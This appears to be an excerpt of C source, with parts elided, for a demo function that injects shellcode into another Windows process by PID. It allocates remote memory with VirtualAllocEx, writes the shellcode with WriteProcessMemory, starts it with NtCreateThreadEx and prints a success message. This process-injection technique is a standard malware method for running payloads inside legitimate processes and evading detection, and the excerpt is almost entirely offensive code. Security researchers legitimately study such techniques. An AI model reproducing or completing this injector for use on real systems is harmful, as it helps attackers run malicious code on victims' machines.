...
DWORD demoShellcodeNtCreateThreadEx(PBYTE pShellcode, SIZE_T szShellcodeLength, DWORD dwProcessId)
{
	...
	LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, szShellcodeLength, MEM_COMMIT, PAGE_READWRITE);
	...
	int n = WriteProcessMemory(hProcess, pRemoteBuffer, pShellcode, szShellcodeLength, NULL);
	if (n == 0)
	{
		wprintf(TEXT("[-] Error: Could not write any bytes into the PID (%d) address space.\n"), dwProcessId);
		return(1);
	...
	if (ntCreateThreadExAddr)
	{
		...
		{
			wprintf(TEXT("[+] Success: Shellcode injected via NtCreateThreadEx().\n"));
			WaitForSingleObject(hRemoteThread, INFINITE);
		}
	}
